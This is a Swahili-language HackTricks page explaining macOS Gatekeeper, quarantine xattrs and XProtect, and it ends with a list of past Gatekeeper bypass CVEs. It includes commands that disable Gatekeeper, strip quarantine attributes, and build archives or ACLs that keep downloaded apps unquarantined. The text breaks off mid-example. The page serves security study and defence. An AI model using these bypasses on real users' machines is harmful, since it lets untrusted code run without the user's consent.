# macOS Gatekeeper / Quarantine / XProtect

{{#include ../../../banners/hacktricks-training.md}}


## Gatekeeper

**Gatekeeper** ni kipengele cha usalama kilichotengenezwa kwa ajili ya mifumo ya uendeshaji ya Mac, kilichoundwa kuhakikisha kuwa watumiaji **wanaendesha software inayoaminika pekee** kwenye mifumo yao. Hufanya kazi kwa **kuthibitisha software** ambayo mtumiaji amedownload na kujaribu kuifungua kutoka **vyanzo vilivyo nje ya App Store**, kama vile app, plug-in, au installer package.

Msingi wa utendaji wa Gatekeeper ni mchakato wake wa **verification**. Hukagua ikiwa software **imesainiwa na developer anayetambuliwa**, hivyo kuhakikisha uhalali wa software hiyo. Zaidi ya hayo, huthibitisha ikiwa software **imekaguliwa na Apple (notarised)**, ikihakikisha kuwa haina maudhui hasidi yanayojulikana na haijabadilishwa baada ya mchakato huo.

Aidha, Gatekeeper huimarisha udhibiti na usalama wa mtumiaji kwa **kuwaomba watumiaji waidhinishe ufunguaji** wa software iliyodownloadwa mara ya kwanza. Ulinzi huu husaidia kuzuia watumiaji wasiendeshe bila kukusudia code ya executable inayoweza kuwa hatari, ambayo huenda waliidhani kimakosa kuwa ni data file isiyo na madhara.

### Saini za Application

Saini za application, zinazojulikana pia kama code signatures, ni sehemu muhimu ya miundombinu ya usalama ya Apple. Hutumika **kuthibitisha utambulisho wa mwandishi wa software** (developer) na kuhakikisha kuwa code haijabadilishwa tangu isainiwe mara ya mwisho.

Hivi ndivyo inavyofanya kazi:

1. **Kusaini Application:** Developer anapokuwa tayari kusambaza application yake, **huisaini application kwa kutumia private key**. Private key hii inahusishwa na **certificate ambayo Apple humpa developer** anapojiunga na Apple Developer Program. Mchakato wa kusaini huhusisha kuunda cryptographic hash ya sehemu zote za app na kuencrypt hash hiyo kwa kutumia private key ya developer.
2. **Kusambaza Application:** Application iliyosainiwa husambazwa kwa watumiaji pamoja na certificate ya developer, ambayo ina public key inayolingana.
3. **Kuthibitisha Application:** Mtumiaji anapodownload na kujaribu kuendesha application, mfumo wa uendeshaji wa Mac hutumia public key kutoka kwenye certificate ya developer kufungua hash hiyo. Kisha huunda upya hash kulingana na hali ya sasa ya application na kuilinganisha na hash iliyofunguliwa. Zikilingana, inamaanisha kuwa **application haijabadilishwa** tangu developer alipoisaini, na mfumo huruhusu application kuendeshwa.

Saini za application ni sehemu muhimu ya teknolojia ya Gatekeeper ya Apple. Mtumiaji anapojaribu **kufungua application iliyodownloadwa kutoka kwenye internet**, Gatekeeper huthibitisha saini ya application. Ikiwa imesainiwa kwa certificate iliyotolewa na Apple kwa developer anayejulikana na code haijabadilishwa, Gatekeeper huruhusu application kuendeshwa. Vinginevyo, huzuia application na kumtahadharisha mtumiaji.

Kuanzia macOS Catalina, **Gatekeeper hukagua pia ikiwa application imekaguliwa na Apple (notarized)**, na hivyo kuongeza safu nyingine ya usalama. Mchakato wa notarization hukagua application dhidi ya masuala ya usalama yanayojulikana na code hasidi, na ukaguzi huo ukifaulu, Apple huongeza ticket kwenye application ambayo Gatekeeper inaweza kuithibitisha.

#### Kukagua Saini

Unapokagua **malware sample**, unapaswa kila mara **kukagua saini** ya binary kwa sababu **developer** aliyeisaini huenda tayari **anahusishwa** na **malware.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Uthibitishaji

Mchakato wa **notarization** wa Apple hutumika kama ulinzi wa ziada wa kuwalinda watumiaji dhidi ya software inayoweza kuwa hatari. Unahusisha **developer kuwasilisha application yao ili ichunguzwe** na **Apple's Notary Service**, ambayo haipaswi kuchanganywa na App Review. Huduma hii ni **automated system** inayochunguza software iliyowasilishwa ili kubaini uwepo wa **malicious content** na matatizo yoyote yanayoweza kuhusiana na code-signing.

Ikiwa software **itafaulu** ukaguzi huu bila kuibua wasiwasi wowote, Notary Service hutengeneza tiketi ya notarization. Kisha developer anatakiwa **kuambatisha tiketi hii kwenye software yao**, mchakato unaojulikana kama 'stapling.' Zaidi ya hayo, tiketi ya notarization pia huchapishwa mtandaoni, ambapo Gatekeeper, teknolojia ya usalama ya Apple, inaweza kuipata.

Wakati wa usakinishaji au utekelezaji wa kwanza wa software na mtumiaji, uwepo wa tiketi ya notarization - iwe imebandikwa kwenye executable au imepatikana mtandaoni - **huijulisha Gatekeeper kwamba software imethibitishwa na Apple**. Kwa sababu hiyo, Gatekeeper huonyesha ujumbe unaoeleza hali hiyo kwenye dialog ya kwanza ya uzinduzi, ukionyesha kwamba software imefanyiwa ukaguzi wa malicious content na Apple. Mchakato huu huongeza imani ya mtumiaji katika usalama wa software wanayosakinisha au kuendesha kwenye mifumo yao.

### spctl & syspolicyd

> [!CAUTION]
> Kumbuka kwamba kuanzia toleo la Sequoia, **`spctl`** hairuhusu tena kurekebisha configuration ya Gatekeeper.

**`spctl`** ni zana ya CLI ya kuorodhesha na kuingiliana na Gatekeeper (kupitia daemon ya `syspolicyd` kwa kutumia XPC messages). Kwa mfano, inawezekana kuona **status** ya GateKeeper kwa:
```bash
# Check the status
spctl --status
```
> [!CAUTION]
> Kumbuka kwamba ukaguzi wa signature wa GateKeeper hufanywa tu kwa **files zenye Quarantine attribute**, si kwa kila file.

GateKeeper itaangalia ikiwa, kulingana na **preferences & signature**, binary inaweza kutekelezwa:

<figure><img src="../../../images/image (1150).png" alt=""><figcaption></figcaption></figure>

**`syspolicyd`** ni daemon kuu inayohusika na kutekeleza Gatekeeper. Inatunza database iliyo kwenye `/var/db/SystemPolicy`, na inawezekana kupata code ya kuunga mkono [database hapa](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/policydb.cpp) na [SQL template hapa](https://opensource.apple.com/source/Security/Security-58286.240.4/OSX/libsecurity_codesigning/lib/syspolicy.sql). Kumbuka kwamba database hii haizuiliwi na SIP na inaweza kuandikwa na root, huku database `/var/db/.SystemPolicy-default` ikitumika kama backup ya awali endapo nyingine itaharibika.

Zaidi ya hayo, bundles **`/var/db/gke.bundle`** na **`/var/db/gkopaque.bundle`** zina files zenye rules zinazoingizwa kwenye database. Unaweza kukagua database hii kama root kwa kutumia:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
**`syspolicyd`** pia hufichua seva ya XPC yenye operesheni mbalimbali kama `assess`, `update`, `record` na `cancel`, ambazo pia zinafikiwa kwa kutumia API za **`Security.framework` za `SecAssessment*`**, na **`spctl`** kwa hakika huwasiliana na **`syspolicyd`** kupitia XPC.

Angalia jinsi sheria ya kwanza ilivyomalizika kwa "**App Store**" na ya pili kwa "**Developer ID**", na kwamba katika picha iliyotangulia ilikuwa **imewezeshwa kutekeleza apps kutoka App Store na developers waliotambuliwa**.\
Uk **badilisha** mpangilio huo kuwa App Store, "**Notarized Developer ID" rules zitatoweka**.

Pia kuna maelfu ya rules za **type GKE**:
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
Hizi ni hash kutoka:

- `/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`
- `/var/db/gke.bundle/Contents/Resources/gk.db`
- `/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`

Au unaweza kuorodhesha taarifa ya awali kwa kutumia:
```bash
sudo spctl --list
```
Chaguo **`--master-disable`** na **`--global-disable`** za **`spctl`** zita **zima kabisa** ukaguzi huu wa signature:
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
Ikiwezeshwa kikamilifu, chaguo jipya litaonekana:

<figure><img src="../../../images/image (1151).png" alt=""><figcaption></figcaption></figure>

Inawezekana **kuangalia ikiwa App itaruhusiwa na GateKeeper** kwa:
```bash
spctl --assess -v /Applications/App.app
```
Kwenye macOS 14 na matoleo ya baadaye, **`syspolicy_check`** ni ukaguzi muhimu wa kiwango cha juu kabla ya usambazaji kwa application bundle. Hutoa uchunguzi wa trusted-execution unaoweza kuchukuliwa hatua zaidi kuliko matokeo ya kawaida ya `spctl`, ingawa Apple bado inapendekeza kujaribu njia halisi ya kupakua/kutoa faili/kuzindua kwa mara ya kwanza, kwa sababu hiyo pia hujaribu uenezaji wa quarantine.<sup>[[14]](#references)</sup>
```bash
# Check the complete app bundle before distribution
syspolicy_check distribution /path/to/App.app

# Keep the lower-level assessment when comparing policy outcomes
spctl --assess --type execute -vv /path/to/App.app
```
Inawezekana kuongeza sheria mpya katika GateKeeper ili kuruhusu utekelezaji wa apps fulani kwa:
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
Kuhusu **kernel extensions**, folda `/var/db/SystemPolicyConfiguration` ina mafaili yenye orodha za kexts zinazoruhusiwa kupakiwa. Zaidi ya hayo, `spctl` ina entitlement `com.apple.private.iokit.nvram-csr` kwa sababu inaweza kuongeza kernel extensions mpya zilizoidhinishwa awali, ambazo pia zinahitaji kuhifadhiwa kwenye NVRAM katika key ya `kext-allowed-teams`.

#### Kusimamia Gatekeeper kwenye macOS 15 (Sequoia) na matoleo ya baadaye

- Bypass ya muda mrefu ya Finder **Ctrl+Open / Right-click → Open** imeondolewa; watumiaji lazima waruhusu wazi app iliyozuiwa kupitia **System Settings → Privacy & Security → Open Anyway** baada ya dialog ya kwanza ya kuzuia.<sup>[[4]](#references)</sup>
- `spctl --master-disable/--global-disable` hazikubaliki tena kama mabadiliko ya policy yasiyohitaji uangalizi. Operesheni zinazorekebisha rule database au hali ya global assessment zimepitwa na wakati, kwa hiyo tumia `spctl` kwa assessment na sanidi enforcement kupitia UI au MDM.

Kuanzia macOS 15 Sequoia, end users hawawezi tena kubadilisha Gatekeeper policy kupitia `spctl`. Usimamizi unafanywa kupitia System Settings au kwa ku-deploy MDM configuration profile yenye payload ya `com.apple.systempolicy.control`. Mfano wa profile snippet wa kuruhusu App Store na developers waliotambuliwa (lakini si "Anywhere"):

<details>
<summary>MDM profile ya kuruhusu App Store na developers waliotambuliwa</summary>
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>PayloadContent</key>
<array>
<dict>
<key>PayloadType</key>
<string>com.apple.systempolicy.control</string>
<key>PayloadVersion</key>
<integer>1</integer>
<key>PayloadIdentifier</key>
<string>com.example.gatekeeper</string>
<key>EnableAssessment</key>
<true/>
<key>AllowIdentifiedDevelopers</key>
<true/>
</dict>
</array>
<key>PayloadType</key>
<string>Configuration</string>
<key>PayloadIdentifier</key>
<string>com.example.profile.gatekeeper</string>
<key>PayloadUUID</key>
<string>00000000-0000-0000-0000-000000000000</string>
<key>PayloadVersion</key>
<integer>1</integer>
<key>PayloadDisplayName</key>
<string>Gatekeeper</string>
</dict>
</plist>
```
</details>

### Faili za Quarantine

Baada ya **kupakua** application au faili, **applications** maalum za macOS kama vile vivinjari vya wavuti au clients wa barua pepe **huambatisha attribute iliyopanuliwa ya faili**, inayojulikana kwa kawaida kama "**quarantine flag**," kwenye faili iliyopakuliwa. Attribute hii hufanya kazi kama hatua ya usalama ya **kuweka alama kwenye faili** kuwa limetoka kwenye chanzo kisichoaminika (intaneti), na huenda likawa na hatari. Hata hivyo, si applications zote huambatisha attribute hii; kwa mfano, software ya kawaida ya BitTorrent client kwa kawaida hupita mchakato huu.

**Kuwepo kwa quarantine flag huashiria kipengele cha usalama cha macOS cha Gatekeeper mtumiaji anapojaribu kutekeleza faili**.

Katika hali ambapo **quarantine flag haipo** (kama ilivyo kwa faili zilizopakuliwa kupitia baadhi ya BitTorrent clients), **ukaguzi wa Gatekeeper huenda usifanywe**. Kwa hivyo, watumiaji wanapaswa kuwa waangalifu wanapofungua faili zilizopakuliwa kutoka kwenye vyanzo visivyo salama au visivyojulikana.

> [!NOTE] > **Kukagua** **uhalali** wa code signatures ni mchakato **unaotumia rasilimali nyingi**, unaojumuisha kutengeneza **hashes** za kriptografia za code na resources zake zote zilizofungwa pamoja nayo. Zaidi ya hayo, kukagua uhalali wa certificate huhusisha kufanya **ukaguzi wa mtandaoni** kwenye servers za Apple ili kubaini kama imebatilishwa baada ya kutolewa. Kwa sababu hizi, ukaguzi kamili wa code signature na notarization **hauwezi kutekelezwa kwa ufanisi kila mara app inapozinduliwa**.
>
> Kwa hivyo, ukaguzi huu **hufanywa tu wakati wa kutekeleza apps zilizo na attribute ya quarantined.**

> [!WARNING]
> Attribute hii lazima **iwekee na application inayounda/inayopakua** faili.
>
> Hata hivyo, faili zilizowekwa sandbox zitakuwa na attribute hii kwenye kila faili wanayounda. Na apps zisizo sandbox zinaweza kuiweka zenyewe, au kubainisha key ya [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information_property_list/lsfilequarantineenabled?language=objc) kwenye **Info.plist**, jambo litakaloufanya mfumo uweke extended attribute ya `com.apple.quarantine` kwenye faili zinazoundwa,

Zaidi ya hayo, faili zote zinazoundwa na process inayotumia **`qtn_proc_apply_to_self`** huwekwa kwenye quarantine. Au API **`qtn_file_apply_to_path`** huongeza quarantine attribute kwenye path maalum ya faili.

Inawezekana **kukagua hali yake na kuwezesha/kuzima** (inahitajika root) kwa:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
Unaweza pia **kuangalia ikiwa faili lina extended attribute ya quarantine** kwa kutumia:
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
Kagua **value** ya **extended** **attributes** na ujue app iliyoandika quarantine attr kwa:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- The user has been allowed to execute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Kwa kweli, process inaweza kuweka quarantine flags kwenye files inazounda (tayari nilijaribu kuweka flag ya USER_APPROVED kwenye file lililoundwa, lakini haikubali):

<details>

<summary>Source Code apply quarantine flags</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

Na **ondoa** sifa hiyo kwa:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
Na utafute faili zote zilizowekwa karantini kwa kutumia:
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
Taarifa za Quarantine pia huhifadhiwa katika database kuu inayosimamiwa na LaunchServices katika **`~/Library/Preferences/com.apple.LaunchServices.QuarantineEventsV2`**, ambayo huwezesha GUI kupata data kuhusu asili ya faili. Zaidi ya hayo, data hii inaweza kuandikwa upya na applications ambazo huenda zinataka kuficha asili yake. Pia, hili linaweza kufanywa kupitia LaunchServices APIs.

#### **libquarantine.dylib**

Library hii hu-export functions kadhaa zinazoruhusu kudhibiti extended attribute fields.

`qtn_file_*` APIs hushughulikia sera za file quarantine, huku `qtn_proc_*` APIs zikitumika kwa processes (files zilizoundwa na process). Functions zisizo-exportiwa za `__qtn_syscall_quarantine*` ndizo zinazotumia sera hizo kwa kuita `mac_syscall` ikiwa na `"Quarantine"` kama argument ya kwanza, ambayo hutuma requests kwa `Quarantine.kext`.

#### **Quarantine.kext**

Kernel extension hii inapatikana tu kupitia **kernel cache kwenye system**; hata hivyo, unaweza _download_ **Kernel Debug Kit kutoka** [**https://developer.apple.com/**](https://developer.apple.com/), ambayo itakuwa na toleo la extension lenye symbols.

Kext hii ita-hook kupitia MACF calls kadhaa ili kunasa matukio yote ya lifecycle ya file: creation, opening, renaming, hard-linking... hata `setxattr`, ili kuizuia kuweka extended attribute ya `com.apple.quarantine`.

Pia hutumia MIBs kadhaa:

- `security.mac.qtn.sandbox_enforce`: Tekeleza quarantine pamoja na Sandbox
- `security.mac.qtn.user_approved_exec`: Querantined procs zinaweza kutekeleza files zilizoidhinishwa pekee

#### Provenance xattr (Ventura na kuendelea)

macOS 13 Ventura ilianzisha mechanism tofauti ya provenance, ambayo hujazwa mara ya kwanza app iliyowekwa quarantine inaporuhusiwa ku-run.<sup>[[2]](#references)</sup> Artefacts mbili huundwa:

- `com.apple.provenance` xattr kwenye directory ya `.app` bundle (binary value yenye ukubwa usiobadilika iliyo na primary key na flags).
- Row katika table ya `provenance_tracking` ndani ya ExecPolicy database katika `/var/db/SystemPolicyConfiguration/ExecPolicy/`, inayohifadhi cdhash ya app pamoja na metadata.

Matumizi ya vitendo:
```bash
# Inspect provenance xattr (if present)
xattr -p com.apple.provenance /Applications/Some.app | hexdump -C

# Observe Gatekeeper/provenance events in real time
log stream --style syslog --predicate 'process == "syspolicyd"'

# Retrieve historical Gatekeeper decisions for a specific bundle
log show --last 2d --style syslog --predicate 'process == "syspolicyd" && eventMessage CONTAINS[cd] "GK scan"'
```
### XProtect

XProtect ni kipengele cha **anti-malware** kilichojengwa ndani ya macOS. XProtect **hukagua kila application inapozinduliwa kwa mara ya kwanza au inapobadilishwa, dhidi ya database yake** ya malware inayojulikana na aina za faili zisizo salama. Unapopakua faili kupitia baadhi ya apps, kama vile Safari, Mail, au Messages, XProtect huchanganua faili hiyo kiotomatiki. Ikiendana na malware yoyote inayojulikana kwenye database yake, XProtect **itazuia faili hiyo kuendeshwa** na kukuarifu kuhusu tishio hilo.

Database ya XProtect **husasishwa mara kwa mara** na Apple kwa definitions mpya za malware, na masasisho haya hupakuliwa na kusakinishwa kiotomatiki kwenye Mac yako. Hii huhakikisha kuwa XProtect daima ina taarifa za sasa kuhusu vitisho vya hivi karibuni vinavyojulikana.

Hata hivyo, ni muhimu kutambua kwamba **XProtect si antivirus solution yenye vipengele kamili**. Hukagua tu orodha maalum ya vitisho vinavyojulikana na haifanyi on-access scanning kama software nyingi za antivirus.

Unaweza kupata taarifa kuhusu update ya hivi karibuni ya XProtect kwa kuendesha:
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
XProtect iko katika eneo linalolindwa na SIP: **/Library/Apple/System/Library/CoreServices/XProtect.bundle** na ndani ya bundle hiyo unaweza kupata taarifa zinazotumiwa na XProtect:

- **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: Huruhusu code yenye cdhashes hizo kutumia legacy entitlements.
- **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: Orodha ya plugins na extensions ambazo haziruhusiwi kupakiwa kupitia BundleID na TeamID, au zinazoonyesha minimum version.
- **`XProtect.bundle/Contents/Resources/XProtect.yara`**: Yara rules za kugundua malware.
- **`XProtect.bundle/Contents/Resources/gk.db`**: SQLite3 database yenye hashes za applications zilizozuiwa na TeamIDs.

Kumbuka kwamba kuna App nyingine katika **`/Library/Apple/System/Library/CoreServices/XProtect.app`** inayohusiana na XProtect, lakini haihusiki na mchakato wa Gatekeeper.

> XProtect Remediator: Katika macOS za kisasa, Apple husafirisha on-demand scanners (XProtect Remediator) zinazoendeshwa mara kwa mara kupitia launchd ili kugundua na kurekebisha familia za malware. Unaweza kuona scans hizi katika unified logs:
>
> ```bash
> log show --last 2h --predicate 'subsystem == "com.apple.XProtectFramework" || category CONTAINS "XProtect"' --style syslog
> ```

### Si Gatekeeper

> [!CAUTION]
> Kumbuka kwamba Gatekeeper **haiendeshwi kila wakati** unapotekeleza application; ni _**AppleMobileFileIntegrity**_ pekee ambayo **itathibitisha executable code signatures** unapotekeleza app ambayo tayari imetekelezwa na kuthibitishwa na Gatekeeper.

Kwa hiyo, hapo awali ilikuwa inawezekana kutekeleza app ili kui-cache na Gatekeeper, kisha **kurekebisha files zisizo executables za application** (kama Electron asar au NIB files), na ikiwa hakukuwa na protections nyingine, application **ingetekelezwa** ikiwa na additions **hasidi**.

Hata hivyo, sasa hili haliwezekani kwa sababu macOS **inazuia kurekebisha files** zilizo ndani ya application bundles. Kwa hiyo, ukijaribu [Dirty NIB](../macos-proces-abuse/macos-dirty-nib.md) attack, utaona kwamba haiwezekani tena kuitumia vibaya kwa sababu baada ya kutekeleza app ili kui-cache na Gatekeeper, hutaweza kurekebisha bundle. Na ukibadilisha, kwa mfano, jina la Contents directory kuwa NotCon (kama ilivyoonyeshwa kwenye exploit), kisha ukatekeleza main binary ya app ili kui-cache na Gatekeeper, itasababisha error na haitatekelezwa.

## Gatekeeper Bypasses

Njia yoyote ya kupita Gatekeeper (kufanikiwa kumfanya mtumiaji adownload kitu na kukitekeleza wakati Gatekeeper inapaswa kukizuia) inachukuliwa kuwa vulnerability katika macOS. Hizi ni baadhi ya CVEs zilizopewa techniques zilizowezesha kupita Gatekeeper hapo awali:

### [CVE-2021-1810](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810)

Ilibainika kwamba ikiwa **Archive Utility** inatumika kwa extraction, files zenye **paths zinazozidi characters 886** hazipewi extended attribute ya com.apple.quarantine. Hali hii huruhusu files hizo bila kukusudia **kupita ukaguzi wa usalama wa Gatekeeper**.<sup>[[5]](#references)</sup>

Angalia [**original report**](https://labs.withsecure.com/publications/the-discovery-of-cve-2021-1810) kwa maelezo zaidi.<sup>[[5]](#references)</sup>

### [CVE-2021-30990](https://ronmasas.com/posts/bypass-macos-gatekeeper)

Application inapoundwa kwa **Automator**, taarifa kuhusu inachohitaji kutekeleza huwa ndani ya `application.app/Contents/document.wflow`, si kwenye executable. Executable ni generic Automator binary tu inayoitwa **Automator Application Stub**.

Kwa hiyo, ungeweza kufanya `application.app/Contents/MacOS/Automator\ Application\ Stub` **ielekeze kwa symbolic link kwenda kwenye Automator Application Stub nyingine ndani ya mfumo**, na itatekeleza kilicho ndani ya `document.wflow` (script yako) **bila kuanzisha Gatekeeper**, kwa sababu executable halisi haina quarantine xattr.<sup>[[6]](#references)</sup>

Mfano wa location inayotarajiwa: `/System/Library/CoreServices/Automator\ Application\ Stub.app/Contents/MacOS/Automator\ Application\ Stub`

Angalia [**original report**](https://ronmasas.com/posts/bypass-macos-gatekeeper) kwa maelezo zaidi.<sup>[[6]](#references)</sup>

### [CVE-2022-22616](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/)

Katika bypass hii, zip file iliundwa ikiwa na application iliyoanza ku-compress kutoka `application.app/Contents` badala ya `application.app`. Kwa hiyo, **quarantine attr** ilitumika kwa **files zote kutoka `application.app/Contents`**, lakini **si kwa `application.app`**, ambayo ndiyo Gatekeeper ilikuwa ikiikagua. Hivyo Gatekeeper ilipitwa kwa sababu `application.app` ilipoanzishwa **haikuwa na quarantine attribute.**<sup>[[7]](#references)</sup>
```bash
zip -r test.app/Contents test.zip
```
Angalia [**ripoti ya awali**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) kwa maelezo zaidi.<sup>[[7]](#references)</sup>

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Hata kama vipengele ni tofauti, exploitation ya vulnerability hii inafanana sana na ile ya awali. Katika hali hii, tutatengeneza Apple Archive kutoka **`application.app/Contents`**, kwa hivyo **`application.app` haitapata quarantine attr** itakapodecompressed na **Archive Utility**.<sup>[[8]](#references)</sup>
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Angalia [**ripoti ya awali**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) kwa maelezo zaidi.<sup>[[8]](#references)</sup>

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

ACL **`writeextattr`** inaweza kutumika kumzuia mtu yeyote kuandika attribute katika faili:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
Zaidi ya hayo, **AppleDouble** file format hunakili faili pamoja na ACEs zake.<sup>[[9]](#references)</sup>

Katika [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) inawezekana kuona kwamba uwakilishi wa maandishi wa ACL uliohifadhiwa ndani ya xattr inayoitwa **`com.apple.acl.text`** utawekwa kama ACL katika faili iliyotolewa kwenye archive. Kwa hivyo, ikiwa ulifinyaza application kuwa zip file kwa kutumia **AppleDouble** file format yenye ACL inayozuia xattrs nyingine kuandikwa ndani yake... quarantine xattr haikuwekwa kwenye application:
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
Angalia [**ripoti ya awali**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) kwa maelezo zaidi.<sup>[[9]](#references)</sup>

Kumbuka kwamba hii pia inaweza kutumiwa kupitia AppleArchives:
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

Ilibainika kuwa **Google Chrome haikuwa ikiweka quarantine attribute** kwenye faili zilizopakuliwa kwa sababu ya matatizo fulani ya ndani ya macOS.<sup>[[10]](#references)</sup>

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

AppleDouble huhifadhi attributes za faili kwenye faili tofauti ambalo jina lake huanza na `._`; hii husaidia kunakili attributes za faili **kati ya mashine za macOS**. Hata hivyo, baada ya kufungua faili ya AppleDouble, faili iliyoanza na `._` **haikupewa quarantine attribute**.<sup>[[11]](#references)</sup>
```bash
mkdir test
